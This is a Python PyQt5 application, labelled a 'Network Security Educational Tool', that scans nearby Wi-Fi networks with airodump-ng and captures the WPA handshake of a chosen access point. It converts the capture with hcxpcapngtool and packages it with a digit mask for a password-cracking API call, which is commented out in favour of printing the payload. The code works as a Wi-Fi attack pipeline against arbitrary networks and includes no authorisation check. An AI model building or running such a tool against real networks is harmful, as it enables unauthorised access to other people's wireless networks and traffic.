import sys
import subprocess
import os
import time
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                            QListWidget, QPushButton, QStackedWidget, QLabel,
                            QListWidgetItem)
from PyQt5.QtCore import Qt, QTimer
import re
import glob
import shutil

class NetworkListItem(QListWidgetItem):
    def __init__(self, bssid, channel, essid):
        super().__init__()
        self.bssid = bssid
        self.channel = channel
        self.essid = essid
        display_text = f"BSSID: {bssid} | Channel: {channel} | ESSID: {essid}"
        self.setText(display_text)

class NetworkMonitor(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Network Security Educational Tool")
        self.setGeometry(100, 100, 800, 600)
        
        # Create output directory if it doesn't exist
        os.makedirs("output_files", exist_ok=True)
        
        self.scanning_process = None
        self.monitoring_timer = QTimer()
        self.monitoring_timer.timeout.connect(self.update_stations)
        
        # Create stacked widget for multiple pages
        self.stacked_widget = QStackedWidget()
        self.setCentralWidget(self.stacked_widget)
        
        # Initialize pages
        self.init_network_page()
        self.init_handshake_page()
        
    def init_network_page(self):
        page = QWidget()
        layout = QVBoxLayout()
        
        title = QLabel("Available Networks")
        title.setAlignment(Qt.AlignCenter)
        layout.addWidget(title)
        
        self.network_list = QListWidget()
        layout.addWidget(self.network_list)
        
        scan_btn = QPushButton("Scan Networks")
        scan_btn.clicked.connect(self.scan_networks)
        layout.addWidget(scan_btn)
        
        select_btn = QPushButton("Monitor Selected Network")
        select_btn.clicked.connect(self.start_network_monitoring)
        layout.addWidget(select_btn)
        
        page.setLayout(layout)
        self.stacked_widget.addWidget(page)
        
    def init_handshake_page(self):
        page = QWidget()
        layout = QVBoxLayout()
        
        title = QLabel("Network Connections and Handshake")
        title.setAlignment(Qt.AlignCenter)
        layout.addWidget(title)
        
        self.stations_list = QListWidget()
        layout.addWidget(self.stations_list)
        
        back_btn = QPushButton("Back")
        back_btn.clicked.connect(self.stop_monitoring_and_go_back)
        layout.addWidget(back_btn)
        
        page.setLayout(layout)
        self.stacked_widget.addWidget(page)
    
    def parse_airodump_output(self, output):
        networks = []
        lines = output.split('\n')
        
        # Find the line that starts with "BSSID"
        for i, line in enumerate(lines):
            if line.strip().startswith("BSSID"):
                # Process network lines
                for network_line in lines[i+1:]:
                    if not network_line.strip() or "STATION" in network_line:
                        break
                    
                    # Parse network information using regular expressions
                    match = re.match(r'\s*([0-9A-F:]{17})\s+.*?\s+(\d+)\s+.*?\s+(\S+)\s*$', 
                                   network_line, re.IGNORECASE)
                    if match:
                        bssid, channel, essid = match.groups()
                        if essid == "<length:  0>":
                            essid = "Hidden Network"
                        networks.append((bssid, channel, essid))
        
        return networks

    def parse_station_output(self, output):
        stations = []
        lines = output.split('\n')
        
        # Find the line that starts with "BSSID" and contains "STATION"
        for i, line in enumerate(lines):
            if "STATION" in line:
                # Process station lines
                for station_line in lines[i+1:]:
                    if not station_line.strip():
                        break
                    
                    # Parse station information
                    parts = station_line.split()
                    if len(parts) >= 2:
                        station_mac = parts[1]
                        power = parts[2] if len(parts) > 2 else "N/A"
                        stations.append((station_mac, power))
        
        return stations

    def scan_networks(self):
        try:
            self.network_list.clear()
            self.network_list.addItem("Scanning networks... Please wait.")
            QApplication.processEvents()

            # Kill conflicting processes
            subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                         capture_output=True, text=True)
            
            # Start monitor mode
            subprocess.run(['sudo', 'airmon-ng', 'start', 'wlan0mon'], 
                         capture_output=True, text=True)
            
            # Create temporary file for output
            temp_file = "output_files/temp-scan"
            
            # Start network scanning in background
            process = subprocess.Popen(
                ['sudo', 'airodump-ng', '-w', temp_file, '--output-format', 'csv', 'wlan0mon'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Wait for a few seconds to collect data
            time.sleep(5)
            
            # Kill the airodump-ng process
            process.terminate()
            process.wait()
            
            # Read the CSV file
            try:
                # Wait a moment for file to be written
                time.sleep(1)
                
                # Find the created CSV file
                csv_file = None
                for file in os.listdir("output_files"):
                    if file.startswith("temp-scan") and file.endswith(".csv"):
                        csv_file = os.path.join("output_files", file)
                        break
                
                if csv_file and os.path.exists(csv_file):
                    with open(csv_file, 'r', encoding='utf-8') as f:
                        content = f.read()
                        
                    # Parse and display networks
                    self.network_list.clear()
                    networks = self.parse_csv_output(content)
                    
                    for bssid, channel, essid in networks:
                        item = NetworkListItem(bssid, channel, essid)
                        self.network_list.addItem(item)
                    
                    # Clean up temporary files
                    # self.clear_output_files()
                else:
                    self.network_list.clear()
                    self.network_list.addItem("No networks found or error reading output")
                    
            except Exception as e:
                self.network_list.clear()
                self.network_list.addItem(f"Error reading scan results: {str(e)}")
                
        except Exception as e:
            self.network_list.clear()
            self.network_list.addItem(f"Error scanning: {str(e)}")
    
    def parse_csv_output(self, content):
        networks = []
        lines = content.split('\n')
        
        # Find the first non-empty line (header)
        start_index = 0
        for i, line in enumerate(lines):
            if "BSSID" in line:
                start_index = i + 1
                break
        
        # Process until empty line or "Station MAC"
        for line in lines[start_index:]:
            if not line.strip() or "Station MAC" in line:
                break
                
            parts = line.strip().split(',')
            if len(parts) >= 14:  # CSV format has multiple columns
                bssid = parts[0].strip()
                channel = parts[3].strip()
                essid = parts[13].strip().replace('\x00', '')
                
                if essid == "":
                    essid = "Hidden Network"
                
                if bssid and channel:  # Only add if we have at least BSSID and channel
                    networks.append((bssid, channel, essid))
        
        return networks
    
    def start_network_monitoring(self):
        current_item = self.network_list.currentItem()
        if not current_item or not isinstance(current_item, NetworkListItem):
            return
        
        self.current_bssid = current_item.bssid
        self.current_channel = current_item.channel
        self.current_essid = current_item.essid
        
        # Clear output files directory
        # self.clear_output_files()
        
        # Start monitoring
        self.start_station_monitoring()
        
        # Show handshake page
        self.stacked_widget.setCurrentIndex(1)
        
        # Start periodic updates
        self.monitoring_timer.start(30000)  # 30 seconds
        
    def clear_output_files(self):
        """Clear all files in the output_files directory"""
        try:
            if os.path.exists("output_files"):
                for filename in os.listdir("output_files"):
                    file_path = os.path.join("output_files", filename)
                    try:
                        if os.path.isfile(file_path):
                            os.unlink(file_path)
                    except Exception as e:
                        print(f"Error deleting {file_path}: {e}")
        except Exception as e:
            print(f"Error clearing output files: {e}")
    
    def start_station_monitoring(self):
        try:
            self.stations_list.clear()
            self.stations_list.addItem("Starting monitoring... Please wait.")
            QApplication.processEvents()
            
            # Create base output filename
            output_file = f"output_files/{self.current_essid}.out"
            
            # Kill any existing monitoring process
            if self.scanning_process:
                self.scanning_process.terminate()
                try:
                    self.scanning_process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    self.scanning_process.kill()
                self.scanning_process = None
            
            # Start new monitoring process with all file generation
            print("Executing dump for bssid:",self.current_bssid,len(self.current_bssid)," channel:",self.current_channel)
            command = [
                'sudo', 'airodump-ng',
                '-c', self.current_channel,
                '--bssid', self.current_bssid,
                '-w', output_file,
                'wlan0mon'
            ]
            
            self.scanning_process = subprocess.Popen(
                command,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Give it a moment to start collecting data
            time.sleep(2)
            
            # Initial station update
            self.update_stations()
            
            # Start processing capture files
            self.process_capture_files()
            
        except Exception as e:
            self.stations_list.clear()
            self.stations_list.addItem(f"Error monitoring: {str(e)}")
    
    def process_capture_files(self):
        try:
            # Find .cap files
            cap_files = glob.glob("output_files/*.cap")
            
            if not cap_files:
                print("No .cap files found yet")
                return
                
            # Get the most recent .cap file
            latest_cap = max(cap_files, key=os.path.getctime)
            base_name = os.path.splitext(latest_cap)[0]
            
            # Install hcxtools if not already installed
            try:
                subprocess.run(['which', 'hcxpcapngtool'], 
                             check=True, 
                             capture_output=True)
            except subprocess.CalledProcessError:
                self.stations_list.addItem("Installing hcxtools...")
                QApplication.processEvents()
                
                subprocess.run(['sudo', 'apt', 'install', '-y', 'hcxtools'],
                             check=True)
            
            # Convert cap to pcap
            self.stations_list.addItem("Converting capture file...")
            time.sleep(4)
            QApplication.processEvents()
            
            subprocess.run([
                'sudo', 'hcxpcapngtool',
                latest_cap,
                '-o', f"{base_name}.pcap"
            ], check=True)
            
            time.sleep(5)

            # Read the pcap file content
            with open(f"{base_name}.pcap", 'rb') as f:
                handshake_string = f.read().hex()
            
            # Prepare API request
            payload = {
                "handshake": handshake_string,
                "mask": "604?d?d?d?d?d?d?d"
            }
            
            # Send to API
            self.stations_list.addItem("Sending data to API...")
            QApplication.processEvents()
            
            '''
            response = requests.post(
                'http://localhost:5000/crack_wifi',
                json=payload
            )
            
            if response.status_code == 200:
                self.stations_list.addItem("Data sent successfully to API")
            else:
                self.stations_list.addItem(
                    f"API Error: {response.status_code} - {response.text}"
                )
            '''
            print("payload data:", payload)
            
        except subprocess.CalledProcessError as e:
            self.stations_list.addItem(f"Command execution error: {str(e)}")
        # except requests.RequestException as e:
        #     self.stations_list.addItem(f"API request error: {str(e)}")
        except Exception as e:
            self.stations_list.addItem(f"Processing error: {str(e)}")
        finally:
            QApplication.processEvents()
    
    def update_stations(self):
        try:
            # Find the most recent CSV file
            csv_files = []
            for filename in os.listdir("output_files"):
                if filename.endswith(".csv") and self.current_essid in filename:
                    file_path = os.path.join("output_files", filename)
                    csv_files.append((file_path, os.path.getctime(file_path)))
            
            if not csv_files:
                self.stations_list.addItem("No data available yet...")
                return
                
            # Get the most recent file
            latest_file = max(csv_files, key=lambda x: x[1])[0]
            
            # Read and parse the file
            with open(latest_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Parse stations from CSV
            stations = self.parse_stations_from_csv(content)
            
            if not stations:
                self.stations_list.addItem("No stations detected...")
            else:
                # Clear only if we have new data to show
                self.stations_list.clear()
                for station_info in stations:
                    self.stations_list.addItem(station_info)
            
            # Process capture files after updating stations
            self.process_capture_files()
                
        except Exception as e:
            self.stations_list.addItem(f"Error updating stations: {str(e)}")
    
    def parse_stations_from_csv(self, content):
        stations = []
        lines = content.split('\n')
        
        # Find the "Station MAC" section
        station_section = False
        for line in lines:
            if "Station MAC" in line:
                station_section = True
                continue
                
            if station_section and line.strip():
                parts = line.strip().split(',')
                if len(parts) >= 6:  # Ensure we have enough parts
                    station_mac = parts[0].strip()
                    power = parts[3].strip()
                    packets = parts[4].strip()
                    probes = parts[5].strip()
                    
                    # Only add if we have a valid MAC address
                    if re.match(r'([0-9A-F]{2}:){5}[0-9A-F]{2}', station_mac, re.I):
                        station_info = (
                            f"Station: {station_mac} | "
                            f"Power: {power} dBm | "
                            f"Packets: {packets} | "
                            f"Probes: {probes}"
                        )
                        stations.append(station_info)
        
        return stations
    
    def stop_monitoring_and_go_back(self):
        # Stop the monitoring timer
        self.monitoring_timer.stop()
        
        # Kill the scanning process if it exists
        if self.scanning_process:
            self.scanning_process.terminate()
            try:
                self.scanning_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.scanning_process.kill()
            self.scanning_process = None
        
        # Clear the output files
        # self.clear_output_files()
        
        # Go back to network list
        self.stacked_widget.setCurrentIndex(0)
    
    def closeEvent(self, event):
        # Clean up when closing the application
        self.stop_monitoring_and_go_back()
        event.accept()

def main():
    app = QApplication(sys.argv)
    window = NetworkMonitor()
    window.show()
    sys.exit(app.exec_())

if __name__ == '__main__':
    main()
